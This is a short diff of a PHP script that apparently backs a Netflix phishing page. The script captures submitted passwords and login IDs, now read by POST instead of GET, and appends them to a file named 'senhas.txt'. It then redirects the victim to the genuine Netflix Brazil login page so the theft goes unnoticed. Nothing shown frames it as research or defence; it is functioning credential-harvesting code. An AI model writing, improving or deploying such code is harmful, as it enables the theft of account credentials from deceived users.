@@ -1,6 +1,6 @@
 <?php
-$caixa1 = $_GET["password"] . "\n";
-$caixa2 = $_GET["userLoginId"] . "\n";
+$caixa1 = $_POST["password"] . "\n";
+$caixa2 = $_POST["userLoginId"] . "\n";
 
 $file = fopen("senhas.txt","a");
 
@@ -9,5 +9,5 @@ $escrever2 = fwrite($file, $caixa2);
 
 fclose($file);
 
-header("Location: http://www.netflix.com/br/login");
+header("Location: www.netflix.com/br/login");
 ?>
